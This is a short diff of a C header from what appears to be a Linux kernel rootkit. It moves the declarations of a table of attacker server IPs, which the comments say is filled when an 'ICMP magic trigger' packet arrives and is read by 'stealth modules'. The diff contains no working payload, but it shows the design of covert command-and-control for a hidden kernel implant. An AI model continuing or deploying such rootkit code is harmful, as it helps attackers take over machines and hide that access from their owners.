@@ -4,16 +4,6 @@
 /* Maximum number of attacker instances (one IP slot per instance) */
 #define MAX_INSTANCES 2
 
-/* Dynamic per-instance server IPs, populated at runtime when the ICMP magic
- * trigger arrives.  Slot 0 = magic seq 1337, slot 1 = magic seq 1338.
- * Defined in modules/icmp.c; all stealth modules read this array. */
-extern __be32 g_srv_ips[MAX_INSTANCES];
-
-/* Protects g_srv_ips[] against concurrent writes (ICMP softirq) and reads
- * (hook functions in various contexts).  Always use spin_lock_irqsave /
- * spin_unlock_irqrestore so it is safe regardless of caller context. */
-extern spinlock_t g_srv_ips_lock;
-
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
@@ -53,6 +43,16 @@ extern spinlock_t g_srv_ips_lock;
 #include <linux/workqueue.h>
 #include <net/ipv6.h>
 #include <linux/tracepoint.h>
+
+/* Dynamic per-instance server IPs, populated at runtime when the ICMP magic
+ * trigger arrives.  Slot 0 = magic seq 1337, slot 1 = magic seq 1338.
+ * Defined in modules/icmp.c; all stealth modules read this array. */
+extern __be32 g_srv_ips[MAX_INSTANCES];
+
+/* Protects g_srv_ips[] against concurrent writes (ICMP softirq) and reads
+ * (hook functions in various contexts).  Always use spin_lock_irqsave /
+ * spin_unlock_irqrestore so it is safe regardless of caller context. */
+extern spinlock_t g_srv_ips_lock;
 #include <linux/io_uring.h>
 #include <linux/netlink.h>
 #include <net/netlink.h>
